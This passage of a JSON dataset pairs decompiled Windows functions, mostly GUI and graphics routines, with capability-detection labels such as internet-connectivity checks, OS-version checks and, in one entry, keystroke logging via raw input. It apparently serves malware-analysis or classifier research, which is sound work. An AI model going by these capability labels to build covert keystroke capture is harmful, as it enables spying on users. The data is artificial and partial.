        "decompiled_code": "\nuint __fastcall fcn.0042788c(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack112;\n    int32_t iStack72;\n    \n    iVar1 = (***param_2)();\n    iVar2 = fcn.0041b654();\n    if (100 < iVar1 - iVar2) {\n        (**(*param_2 + 0xc))();\n        (**(*param_2 + 0x14))();\n        if ((iStack112 == 1) && (iStack72 == 0x464d4520)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 155
    },
    "004278ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004278ec(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        fcn.00427360();\n    }\n    else if (1 < *(*(in_EAX + 0x28) + 4)) {\n        iVar2 = fcn.00404610();\n        iVar1 = *(*(in_EAX + 0x28) + 8);\n        if (iVar1 != 0) {\n            uVar3 = sub.gdi32.dll_CopyEnhMetaFileA(iVar1, 0);\n            *(iVar2 + 8) = uVar3;\n        }\n        *(iVar2 + 0x10) = *(*(in_EAX + 0x28) + 0x10);\n        *(iVar2 + 0xc) = *(*(in_EAX + 0x28) + 0xc);\n        *(iVar2 + 0x18) = *(*(in_EAX + 0x28) + 0x18);\n        *(iVar2 + 0x1c) = *(*(in_EAX + 0x28) + 0x1c);\n        *(iVar2 + 0x20) = *(*(in_EAX + 0x28) + 0x20);\n        fcn.004280e4();\n        *(in_EAX + 0x28) = iVar2;\n        fcn.004280e0();\n    }\n    return;\n}\n",
        "token_count": 345
    },
    "00429218": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00429218(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 0x28) == 1) && (*(iVar1 + 0x2a) == 1)) {\n        return CONCAT31(iVar1 + 0x18 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 100
    },
    "00429d70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00429d70(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack128;\n    uint uStack124;\n    uchar *puStack120;\n    int32_t iStack116;\n    uint uStack112;\n    uint *puStack108;\n    uint lpvObject;\n    int32_t var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (param_2 != *(iVar1 + 8)) {\n        puStack108 = 0x429d90;\n        fcn.004293f8();\n        puStack108 = 0x429d9f;\n        fcn.00403aac();\n        if (param_2 != 0) {\n            puStack108 = &fcn.00429d70::lpvObject;\n            uStack112 = 0x54;\n            puStack120 = 0x429daf;\n            iStack116 = param_2;\n            sub.gdi32.dll_GetObjectA();\n        }\n        if (*(iVar1 + 4) == 1) {\n            var_4h = *(iVar1 + 0x10);\n            *(iVar1 + 0x10) = 0;\n        }\n        else if (*(iVar1 + 0x10) == *0x4979f8) {\n            var_4h = *0x4979f8;\n        }\n        else {\n            puStack120 = 0x429ddc;\n            var_4h = fcn.00428918();\n        }\n        uStack124 = 0x429e0b;\n        uStack128 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff80;\n        uVar2 = 0;\n        puStack120 = &stack0xfffffffc;\n        fcn.00429668(0, 0, &fcn.00429d70::lpvObject);\n        *in_FS_OFFSET = uVar2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 467
    },
    "00429f8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00429f8c(uint param_1, uint8_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint auStack96 [4];\n    uint16_t uStack80;\n    uint16_t uStack78;\n    uint uStack72;\n    uint16_t uStack60;\n    uint16_t uStack58;\n    \n    iVar1 = in_EAX[10];\n    if ((*(iVar1 + 0x3c) == 1) && (*(iVar1 + 0x3e) == 1)) {\n        uVar2 = 1;\n    }\n    else {\n        uVar2 = 0;\n    }\n    if (param_2 != uVar2) {\n        fcn.00429408();\n        puVar4 = iVar1 + 0x18;\n        puVar5 = auStack96;\n        for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        uStack72 = 0;\n        uStack60 = param_2;\n        uStack80 = param_2;\n        uStack78 = uStack80;\n        uStack58 = uStack60;\n        fcn.00428d28(auStack96);\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 365
    },
    "0042a008": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a008(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint uStack124;\n    uint uStack120;\n    uchar *puStack116;\n    uint var_58h;\n    uint var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (param_2 != *(iVar1 + 0x10)) {\n        if ((param_2 == 0) && (*(iVar1 + 4) == 1)) {\n            fcn.00423134();\n            *(iVar1 + 0x10) = 0;\n        }\n        else {\n            fcn.004293f8();\n            fcn.00429408();\n            puVar3 = iVar1 + 0x18;\n            puVar4 = &fcn.0042a008::var_58h;\n            for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            puStack116 = 0x42a06e;\n            var_4h = fcn.004282b4(0, &fcn.0042a008::var_58h);\n            uStack120 = 0x42a0a0;\n            uStack124 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff84;\n            uVar5 = 0;\n            puStack116 = &stack0xfffffffc;\n            fcn.00429668(0, *(iVar1 + 0x70), &fcn.0042a008::var_58h);\n            *in_FS_OFFSET = uVar5;\n        }\n        fcn.004281ac();\n        *(in_EAX + 0x22) = 1;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 480
    },
    "0042ac28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid fcn.0042ac28(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uchar *puStack272;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack272 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack276 = 0x42ad2b;\n    uStack280 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee8;\n    uStack284 = 0x48;\n    uStack288 = *0x497a00;\n    uStack292 = 8;\n    puStack296 = 0x42ac53;\n    *0x490b68 = sub.kernel32.dll_MulDiv();\n    *0x490b68 = -*0x490b68;\n    if (**0x492aec == 1) {\n        puStack296 = 0x42ac69;\n        cVar1 = fcn.0042abe4();\n        if (cVar1 == -0x80) {\n            puStack296 = 0x42ac7a;\n            fcn.00405504();\n        }\n    }\n    puStack296 = 0x42ac86;\n    var_8h = fcn.00420f38();\n    uStack300 = 0x42ace3;\n    uStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    puStack296 = &stack0xfffffffc;\n    fcn.00421014();\n    cVar1 = fcn.0042127c();\n    if (cVar1 != '\\0') {\n        fcn.004218dc();\n        fcn.00420fe4();\n    }\n    *in_FS_OFFSET = uStack304;\n    puStack296 = 0x42acea;\n    uStack300 = 0x42ace2;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 468
    },
    "0043ab74": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043ab74(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX == *(*0x497c14 + 0x30)) {\n        return -(*0x497c24 != '\\0');\n    }\n    iVar1 = sub.user32.dll_IsIconic();\n    return iVar1;\n}\n",
        "token_count": 83
    },
    "0043b514": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043b514(uint arg_8h)\n\n{\n    int16_t in_AX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0x100000;\n    if (in_AX == 1) {\n        uVar3 = 0x200000;\n    }\n    uVar1 = fcn.00457a28(0xfffffff0);\n    uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n    return uVar2 & 0xffffff00 | (uVar2 & uVar3) != 0;\n}\n",
        "token_count": 144
    },
    "0043b5c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043b5c4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_6h;\n    \n    uVar1 = fcn.00457a28(0xfffffff0);\n    sub.user32.dll_GetWindowLongA(uVar1);\n    if (*(in_EAX + 0x18) == '\\x01') {\n        iVar2 = fcn.0043b548(&stack0xfffffffc);\n        iVar3 = fcn.0044f684();\n        iVar2 = iVar2 + iVar3;\n    }\n    else {\n        iVar2 = fcn.0043b548(&stack0xfffffffc);\n        iVar3 = fcn.0044f640();\n        iVar2 = iVar2 + iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 197
    },
    "0043b65c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043b65c(int32_t arg_8h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_4h;\n    \n    var_1ch = 0x1c;\n    var_18h = 0x10;\n    iVar1 = *(*(arg_8h + -8) + 6);\n    uVar2 = fcn.00457a28(*(*(arg_8h + -4) + 0x18) == '\\x01', &var_1ch);\n    iVar3 = (***0x4927e0)(uVar2);\n    iVar4 = iVar1;\n    if (iVar3 != 0) {\n        iVar4 = var_4h;\n    }\n    return iVar4;\n}\n",
        "token_count": 205
    },
    "0044111c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044111c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_ECX;\n    uchar *in_EDX;\n    \n    if (*(in_EAX + 0x158) == '\\x01') {\n        *in_EDX = 1;\n        *in_ECX = *(in_EAX + 0x160);\n    }\n    else {\n        *in_EDX = 0;\n        fcn.004054c0();\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "00444034": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00444034(void)\n\n{\n    char in_AL;\n    uint uStack8;\n    int32_t iStack4;\n    \n    uStack8 = 8;\n    iStack4 = -(in_AL != '\\0');\n    sub.user32.dll_SystemParametersInfoA(0x49, 8, &uStack8, 0);\n    return;\n}\n",
        "token_count": 80
    },
    "00446598": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446598(int32_t arg_8h)\n\n{\n    uint8_t in_AL;\n    int32_t iVar1;\n    \n    iVar1 = sub.user32.dll_IsWindowVisible(*(*(arg_8h + -4) + 0x30));\n    if ((1U - (iVar1 == 0) == *0x491608) && (in_AL != *0x491608)) {\n        sub.user32.dll_SetWindowPos(*(*(arg_8h + -4) + 0x30), 0, 0, 0, 0, 0, *(in_AL * 2 + 0x49160c));\n        *0x491608 = in_AL;\n    }\n    return;\n}\n",
        "token_count": 162
    },
    "004479ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004479ac(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x447a59;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uVar1 = fcn.00404610();\n    *(in_EAX + 0x4c) = uVar1;\n    if (((*(in_EAX + 0x30) < 1) || (0x8000 < *(in_EAX + 0x30))) || (*(in_EAX + 0x34) < 1)) {\n        fcn.004075f4();\n        fcn.0040da70();\n        fcn.00404eb4();\n    }\n    *(in_EAX + 0x38) = 4;\n    *(in_EAX + 0x41) = 1;\n    fcn.004484c4();\n    *(in_EAX + 0x43) = 0;\n    *(in_EAX + 0x44) = 0x1fffffff;\n    *(in_EAX + 0x48) = 0x1fffffff;\n    uVar1 = fcn.00428b88();\n    *(in_EAX + 0x50) = uVar1;\n    fcn.00447a78();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x447a60;\n    uStack20 = 0x447a58;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 388
    },
    "00447bb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447bb0(int32_t *param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    fcn.0044844c();\n    if (param_2 == NULL) {\n        (**(**(in_EAX + 0x50) + 0x68))();\n    }\n    else {\n        cVar1 = fcn.004291c8();\n        if (cVar1 == '\\x01') {\n            (**(*param_2 + 0x68))();\n        }\n        else {\n            (**(*param_1 + 8))();\n            (**(*param_1 + 0x70))();\n            (**(*param_1 + 0x68))();\n        }\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "00449ce4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449ce4(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (param_2 != *(in_EAX + 0x6a)) {\n        if (in_EAX[0x17] != 0) {\n            cVar1 = *(in_EAX[0x17] + 0x58);\n            if (cVar1 == '\\x01') {\n                *(in_EAX + 0x6a) = param_2;\n                return;\n            }\n            if (cVar1 == '\\x02') {\n                param_2 = '\\x01';\n            }\n        }\n        iVar3 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                piVar2 = fcn.004047f0();\n                if (piVar2 != NULL) {\n                    (**(*piVar2 + 0x54))();\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        *(in_EAX + 0x6a) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 296
    },
    "0044d438": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0044d438(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.00457a28();\n        uVar2 = fcn.00457a28(uVar2);\n        iVar3 = sub.user32.dll_IsChild(uVar2);\n        return iVar3 != 0;\n    }\n    return false;\n}\n",
        "token_count": 119
    },
    "0044d760": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0044d760(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    if (*(*0x497c7c + 8) != 0) {\n        iVar1 = fcn.0044d62c(*0x497c7c + 0x10, *(*0x497c7c + 8));\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 108
    },
    "0044eff0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044eff0(char param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    fcn.0041fb68();\n    if (param_1 == '\\x01') {\n        if (param_2 == in_EAX[0x20]) {\n            fcn.0044fc78();\n        }\n        else {\n            iVar1 = (**(*in_EAX + 0x3c))();\n            if (param_2 == iVar1) {\n                fcn.0044ee5c();\n            }\n            else if (param_2 == in_EAX[0x25]) {\n                in_EAX[0x25] = 0;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "00453b78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453b78(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0044eff0();\n    if ((param_2 == *(in_EAX + 0x23c)) && (param_1 == '\\x01')) {\n        *(in_EAX + 0x23c) = 0;\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "00453bd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453bd0(uint param_1, uint32_t *param_2)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00450398();\n    if (cVar1 != '\\0') {\n        *param_2 = *param_2 | 0x2000;\n    }\n    cVar1 = fcn.004503c8();\n    if (cVar1 != '\\0') {\n        *param_2 = *param_2 | 0x4000;\n    }\n    cVar1 = fcn.0040483c();\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0040483c();\n        if (cVar1 == '\\0') {\n            *param_2 = *param_2 | 0x1000;\n        }\n        else {\n            cVar1 = fcn.0040483c();\n            if (cVar1 == '\\x01') {\n                *param_2 = *param_2;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "00459624": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00459624(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    bool bVar3;\n    uint x;\n    uint y;\n    uint var_4h;\n    \n    bVar3 = false;\n    cVar1 = fcn.00447a64();\n    if ((cVar1 != '\\0') && (in_EDX != *(in_EAX + 0x6c))) {\n        fcn.00459688();\n        *(in_EAX + 0x6c) = in_EDX;\n        fcn.00459504(&x);\n        iVar2 = sub.comctl32.dll_ImageList_DragEnter(*(in_EAX + 0x6c), x, y);\n        bVar3 = iVar2 != 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 200
    },
    "004596ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.004596ac(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uStack28;\n    uint *puVar4;\n    uint auStack20 [2];\n    \n    puVar4 = auStack20;\n    cVar1 = fcn.00447a64();\n    if (cVar1 == '\\0') {\n        uVar3 = 0;\n    }\n    else {\n        fcn.00459504(auStack20);\n        uStack28 = auStack20[0];\n        iVar2 = sub.comctl32.dll_ImageList_DragMove(puVar4);\n        uVar3 = iVar2 != 0;\n    }\n    return CONCAT44(uStack28, uVar3);\n}\n",
        "token_count": 168
    },
    "004599a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004599a0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != *(*(in_EAX + 0x1c) + 100)) {\n        in_EAX = *(in_EAX + 0x14);\n    }\n    if (*(in_EAX + 0x10) != '\\x01') {\n        if (*(in_EAX + 0x10) == '\\x02') {\n            fcn.00459a30();\n        }\n        else {\n            fcn.0040da70();\n            fcn.00404eb4();\n        }\n        return;\n    }\n    fcn.00459a30();\n    return;\n}\n",
        "token_count": 150
    },
    "004599e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004599e8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != *(*(in_EAX + 0x1c) + 100)) {\n        in_EAX = *(in_EAX + 0x14);\n    }\n    if (*(in_EAX + 0x10) != '\\x01') {\n        if (*(in_EAX + 0x10) == '\\x02') {\n            fcn.00459ab4();\n        }\n        else {\n            fcn.0040da70();\n            fcn.00404eb4();\n        }\n        return;\n    }\n    fcn.00459ab4();\n    return;\n}\n",
        "token_count": 150
    },
    "00459f98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00459f98(int32_t param_1, char param_2)\n\n{\n    uchar uVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_ch;\n    uint var_5h;\n    \n    if (param_2 != '\\0') {\n        puStack48 = 0x459fad;\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n    }\n    puStack48 = 0x459fc0;\n    fcn.00404610();\n    in_EAX[3] = 4;\n    in_EAX[5] = param_1;\n    in_EAX[0x1c] = 0x80000;\n    in_EAX[6] = 0xc;\n    if ((*(param_1 + 0x5b) == '\\x01') || (*(param_1 + 0x5b) == '\\x02')) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    *(in_EAX + 7) = uVar1;\n    puStack48 = 0x45a011;\n    iVar2 = fcn.0045990c();\n    in_EAX[0x19] = iVar2;\n    puStack48 = 0x45a023;\n    iVar2 = fcn.00424684();\n    in_EAX[4] = iVar2;\n    puStack48 = 0x45a037;\n    fcn.0042b0b4();\n    puStack48 = 0x45a040;\n    fcn.00424800();\n    puStack48 = 0x45a048;\n    fcn.0045a16c();\n    uStack52 = 0x45a0a5;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    iVar2 = fcn.00453b18();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00453adc(0);\n            (**(*in_EAX + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00459b6c();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x45a0ac;\n    uStack52 = 0x45a0a4;\n    fcn.0045a170();\n    return;\n}\n",
        "token_count": 601
    },
    "0045bc9c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045bc9c(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0045ca6c();\n    fcn.0045bd64();\n    sub.user32.dll_ReleaseDC(*(in_EAX + 0x5c), *(in_EAX + 0x58));\n    if (*(*(*(in_EAX + 0x60) + 0x14) + 0x10) == '\\x01') {\n        fcn.00459eb0();\n    }\n    else {\n        fcn.00459eb0();\n    }\n    fcn.0045bbc0();\n    fcn.0045a244(0x45bd40);\n    *(in_EAX + 0x60) = 0;\n    return;\n}\n",
        "token_count": 169
    },
    "0045bd64": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045bd64(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        if (*(*(*(in_EAX + 0x60) + 0x14) + 0x10) == '\\x01') {\n            iVar1 = fcn.00459a30();\n            iVar2 = *(in_EAX + 0xc) >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((*(in_EAX + 0xc) & 1) != 0);\n            }\n            iVar2 = *(in_EAX + 0x54) - iVar2;\n            iVar3 = fcn.00459ab4(iVar1, iVar2);\n            iVar3 = iVar3 + iVar1;\n            iVar4 = iVar2 + *(in_EAX + 0xc);\n        }\n        else {\n            iVar1 = *(in_EAX + 0xc) >> 1;\n            if (iVar1 < 0) {\n                iVar1 = iVar1 + ((*(in_EAX + 0xc) & 1) != 0);\n            }\n            iVar1 = *(in_EAX + 0x50) - iVar1;\n            iVar2 = fcn.00459a30(iVar1);\n            iVar3 = iVar1 + *(in_EAX + 0xc);\n            iVar4 = fcn.00459ab4(iVar1, iVar2, iVar3);\n            iVar4 = iVar4 + iVar2;\n        }\n        iVar4 = fcn.00424860(iVar1, iVar2, iVar3, iVar4);\n        iVar3 = *(in_EAX + 0x58);\n        uVar5 = sub.gdi32.dll_SelectObject(iVar3, iVar4);\n        sub.gdi32.dll_PatBlt(*(in_EAX + 0x58), iVar3, iVar4, iVar1 - iVar3, iVar2 - iVar4, 0x5a0049);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 0x58), uVar5);\n    }\n    return;\n}\n",
        "token_count": 503
    },
    "0045c67c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
